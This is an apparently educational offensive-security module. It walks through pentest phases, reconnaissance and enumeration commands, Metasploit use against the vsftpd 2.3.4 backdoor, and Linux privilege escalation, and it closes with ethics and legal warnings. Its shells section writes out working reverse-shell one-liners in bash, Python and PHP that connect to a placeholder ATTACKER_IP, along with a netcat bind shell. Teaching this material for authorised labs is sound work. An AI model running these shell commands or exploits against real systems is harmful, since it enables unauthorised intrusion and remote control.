Offensive Security Fundamentals

Offensive security focuses on simulating real attacks to identify vulnerabilities before a malicious attacker does.

In this module you will learn the pentesting phases: reconnaissance, service enumeration, exploitation, shells, privilege escalation and professional ethics.

🔁 The 5 Phases of a Pentest

A professional pentest always follows a structured methodology. Knowing the phases helps you organise your work and avoid skipping critical steps.

1
Reconnaissance
Passive & active information gathering. OSINT, DNS, WHOIS, network scanning.
2
Scanning / Enumeration
Identify open ports, active services and versions. Direct contact with the target begins here.
3
Exploitation
Use discovered vulnerabilities to gain unauthorised access.
4
Post-Exploitation
Persistence, privilege escalation, lateral movement, data exfiltration.
5
Reporting
Document findings, evidence, impact and remediation recommendations.
💡
Without a good report, the pentest has no value The final deliverable to the client is the report — it must include clear evidence, realistic impact descriptions and actionable remediation steps.

🔍 Reconnaissance — Essential Commands

Reconnaissance is divided into passive (no direct contact) and active (direct interaction). Always start passive to avoid triggering alerts.

bash — recon 
# Local system information
whoami              # current user
hostname            # machine name
uname -a            # kernel version and system info
ip a                # network interfaces and IPs
ip route            # gateway and routing table

# Network reconnaissance
ping -c 4 8.8.8.8              # test connectivity (4 packets)
nmap -sn 192.168.1.0/24        # ping sweep — discover active hosts
nmap -sV -sC 192.168.1.10      # service versions + default scripts
nmap -p- 192.168.1.10          # all ports (0–65535)
nmap -A 192.168.1.10           # aggressive scan (OS + versions + scripts)

# OSINT / DNS
whois domain.com               # registration and domain owner
dig domain.com ANY             # all DNS records
host domain.com                # simple DNS resolution
nslookup domain.com            # alternative to dig
💡 OSINT before anything else

Before running nmap, research the target from open sources: LinkedIn, shodan.io, BuiltWith, Google Dorks (site:, filetype:, intitle:). You gather information without generating any logs on the target.

📡 Service Enumeration

After identifying open ports, you need to understand what is running on each one. These are the most common services in CTFs and real environments.

bash — enumeration 
# FTP (port 21) — try anonymous access
ftp 192.168.1.10
# Use username: anonymous | password: (empty or email)

# SSH (port 22) — banner grabbing
nc 192.168.1.10 22
ssh -V                         # local SSH client version

# HTTP/HTTPS (port 80/443)
curl -I http://192.168.1.10            # HTTP headers (version, server)
nikto -h http://192.168.1.10           # basic web vulnerability scan
gobuster dir -u http://192.168.1.10 -w /usr/share/wordlists/dirb/common.txt

# SMB (port 445) — Windows file shares
smbclient -L //192.168.1.10 -N        # list shares without password
enum4linux 192.168.1.10               # full SMB enumeration
crackmapexec smb 192.168.1.10         # quick SMB info

# SMTP (port 25) — user enumeration
nc 192.168.1.10 25
VRFY root
VRFY admin
Banner Grabbing

Connecting to a port and reading its initial response (banner) often reveals the exact software name and version running. With that you can search for CVEs on nvd.nist.gov or exploits on exploit-db.com.

💥 Exploitation — Concepts & Tools

Exploitation should only happen after clearly identifying a vulnerability. Never use exploits blindly — you could crash the target system or lose access.

bash — searchsploit & metasploit 
# Search for exploits with searchsploit (local Exploit-DB copy)
searchsploit vsftpd 2.3.4             # find exploits for this service/version
searchsploit -x 17491                 # examine exploit without copying
searchsploit -m 17491                 # copy exploit to current folder
searchsploit --update                 # update the local database

# Metasploit Framework — basic usage
msfconsole                            # start Metasploit
search vsftpd                         # find related modules
use exploit/unix/ftp/vsftpd_234_backdoor
show options                          # show required parameters
set RHOSTS 192.168.1.10               # target IP
set LHOST 192.168.1.5                 # your IP (for reverse shell)
run                                   # execute the exploit
CVE vs Exploit

A CVE (Common Vulnerabilities and Exposures) is the official identifier for a vulnerability. An exploit is the code that actively takes advantage of it. Not every CVE has a publicly available exploit.

Exploit-DB vs Metasploit

Exploit-DB provides exploits you can study and run manually — better for learning. Metasploit automates much of the process and has integrated payloads, ideal for quick lab tests.

🐚 Shells — Bind Shell vs Reverse Shell

After successful exploitation, the goal is to obtain an interactive shell on the target machine to continue the investigation and demonstrate impact.

bash — shells 
# REVERSE SHELL — victim connects back to attacker
# 1. Attacker listens:
nc -lvnp 4444

# 2. On the victim, run one of these (depending on what is available):
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# BIND SHELL — victim listens, attacker connects
# On the victim:
nc -lvnp 4444 -e /bin/bash
# On the attacker:
nc 192.168.1.10 4444

# Stabilise the shell (full TTY)
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Then: Ctrl+Z → stty raw -echo → fg
When to use each?

A reverse shell is more common because the victim initiates the connection — it bypasses firewalls that block inbound connections. A bind shell is useful when the attacker has no accessible public IP but has local access.

Stabilising the shell

Shells obtained via nc are unstable — Ctrl+C kills everything, there is no autocomplete. Use python3 -c 'import pty;pty.spawn("/bin/bash")' to get a full, interactive TTY shell.

⬆️ Linux Privilege Escalation — Basics

You often gain access as a low-privilege user. Privilege escalation (privesc) lets you reach root — the real objective in most CTFs.

bash — privesc enumeration 
# Basic post-access enumeration
id                               # groups and current user
sudo -l                          # commands you can run as sudo
cat /etc/passwd                  # all system users
cat /etc/crontab                 # scheduled tasks (may have writable scripts)
find / -perm -4000 2>/dev/null   # SUID binaries (run as root!)
find / -writable -type f 2>/dev/null | grep -v proc
env                              # environment variables (tokens, passwords)
history                          # previously executed commands
ss -tlnp                         # locally open ports

# Kernel version (for kernel exploits)
uname -r
searchsploit linux kernel 4.4

# Automated enumeration tools
./linpeas.sh                     # full privesc enumeration
./pspy64                         # monitor processes without root
SUID — What is it and why does it matter?

Binaries with the SUID bit run with the owner's permissions (often root), regardless of who executes them. Check gtfobins.github.io — it lists SUID binaries you can abuse to escalate privileges.

sudo -l — Always the first step

If you can run any command as sudo without a password (e.g. sudo vim, sudo find), you can likely get root. Check gtfobins.github.io for the specific binary.

🔧 Netcat — The Swiss Army Knife of Networking

Netcat (nc) is an essential pentesting tool. It lets you create TCP/UDP connections, transfer files, do banner grabbing and create shells.

bash — netcat 
# Connect to a port (banner grabbing)
nc 192.168.1.10 80
nc 192.168.1.10 22

# Listen on a port
nc -lvnp 4444

# File transfer
# Receiver (listens):
nc -lvnp 4444 > received_file.txt
# Sender (sends):
nc 192.168.1.10 4444 < file_to_send.txt

# Simple chat between two machines
# Machine A:
nc -lvnp 1234
# Machine B:
nc MACHINE_A_IP 1234

# Basic port scanning with nc
nc -zv 192.168.1.10 20-80   # test ports 20 to 80

⚖️ Ethics and Legality in Pentesting

Offensive security without authorisation is a crime. Knowing the ethical rules is just as important as the techniques themselves.

Written Authorisation is Mandatory

Never test a system without explicit written permission from the owner. In a professional context there is always a Rules of Engagement (RoE) document — defining the scope, limits and objectives of the pentest.

Recommended Lab Environments

Practise in legal environments: TryHackMe (ideal for beginners), HackTheBox (more challenging), VulnHub (free local VMs). You can also build your own lab with VirtualBox + Kali Linux + Metasploitable2.

Responsible Disclosure

If you find a real vulnerability (e.g. through a bug bounty programme like HackerOne or Bugcrowd), follow the Responsible Disclosure process: notify the owner privately before making it public.

🚨
Unauthorised access is a criminal offence In most countries, accessing computer systems without authorisation is punishable by imprisonment, even with good intentions. Always get written permission before testing any system.
